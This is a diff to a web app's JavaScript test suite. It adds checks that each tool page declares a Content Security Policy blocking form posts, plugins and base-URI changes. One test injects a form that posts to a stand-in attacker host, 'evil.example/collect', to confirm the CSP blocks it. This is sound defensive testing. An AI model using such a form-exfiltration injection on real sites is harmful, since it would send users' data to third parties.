@@ -3936,6 +3936,60 @@ const SUITES = [
     }],
   ],
 },
+{
+  id: 'AUD-08', title: 'Every page has a CSP, and none lets a form post data out', note: 'form-action was missing (it does not fall back to default-src), and the two tool pages had no CSP at all',
+  cases: [
+    ['each page declares a CSP with form-action and object-src locked', async w => {
+      const missing = [];
+      for (const page of ['youtube-playlist-manager.html', 'reel-studio.html', 'quota-estimator.html', 'how-it-works.html']) {
+        const csp = await aud08Csp(page);
+        if (!csp) { missing.push(page + ': no CSP'); continue; }
+        if (!/(^|;)\s*form-action 'none'/.test(csp)) missing.push(page + ': form-action');
+        if (!/(^|;)\s*object-src 'none'/.test(csp)) missing.push(page + ': object-src');
+        if (!/(^|;)\s*base-uri 'self'/.test(csp)) missing.push(page + ': base-uri');
+      }
+      return eq(missing, [], 'gaps');
+    }],
+    ['an injected form cannot post to another site', async w => {
+      const doc = w.document;
+      const sink = doc.createElement('iframe');
+      sink.name = 'aud08sink';
+      sink.style.display = 'none';
+      const form = doc.createElement('form');
+      form.action = 'https://evil.example/collect';
+      form.method = 'POST';
+      form.target = 'aud08sink';
+      const violations = [];
+      const onViolation = e => violations.push(e.effectiveDirective || e.violatedDirective);
+      doc.addEventListener('securitypolicyviolation', onViolation);
+      doc.body.append(sink, form);
+      try {
+        form.submit();
+        await new Promise(r => setTimeout(r, 300));
+        return ok(violations.includes('form-action'), 'the post was not blocked by the CSP: ' + JSON.stringify(violations));
+      } finally { doc.removeEventListener('securitypolicyviolation', onViolation); form.remove(); sink.remove(); }
+    }],
+    ["the estimator's inline script matches the hash its CSP allows", async w => {
+      const html = await fetch('quota-estimator.html?aud08=' + Date.now()).then(r => r.text());
+      const code = html.match(/<script>([\s\S]*?)<\/script>/)[1];
+      const digest = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(code));
+      const hash = 'sha256-' + btoa(String.fromCharCode(...new Uint8Array(digest)));
+      const csp = await aud08Csp('quota-estimator.html');
+      ok(!/script-src[^;]*'unsafe-inline'/.test(csp), "script-src still allows 'unsafe-inline'");
+      return ok(csp.includes("'" + hash + "'"), 'CSP does not allow the script as it is now; expected ' + hash);
+    }],
+    ['how-it-works still runs its script under its CSP', async w => {
+      const f = document.createElement('iframe');
+      f.style.cssText = 'display:block;position:absolute;left:-12000px;top:0;width:1024px;height:768px;border:0;';
+      f.src = 'how-it-works.html?aud08=' + Date.now();
+      try {
+        await new Promise((res, rej) => { f.onload = res; setTimeout(() => rej(new Error('page did not load')), 15000); document.body.appendChild(f); });
+        await new Promise(r => setTimeout(r, 200));
+        return ok(f.contentDocument.querySelector('[data-en]'), 'the page script did not run');
+      } finally { f.remove(); }
+    }],
+  ],
+},
 // Keep this suite last: its final case leaves the page in the "about to reload"
 // state a real deletion ends in, where the log no longer persists.
 {
@@ -4174,6 +4228,13 @@ async function runRetry(w, method, script) {
     catch (e) { threw = true; message = e.message; }
     return { fetches, threw, message, toasts };
   } finally { Object.assign(w, real); }
+}
+
+// AUD-08 — the CSP a page declares in its <meta>, or '' if it has none.
+async function aud08Csp(page) {
+  const doc = new DOMParser().parseFromString(await fetch(page + '?aud08=' + Date.now()).then(r => r.text()), 'text/html');
+  const meta = doc.querySelector('meta[http-equiv="Content-Security-Policy"]');
+  return meta ? meta.getAttribute('content') : '';
 }
 
 // AUD-10 — run something that logs, persist the log and return the entries
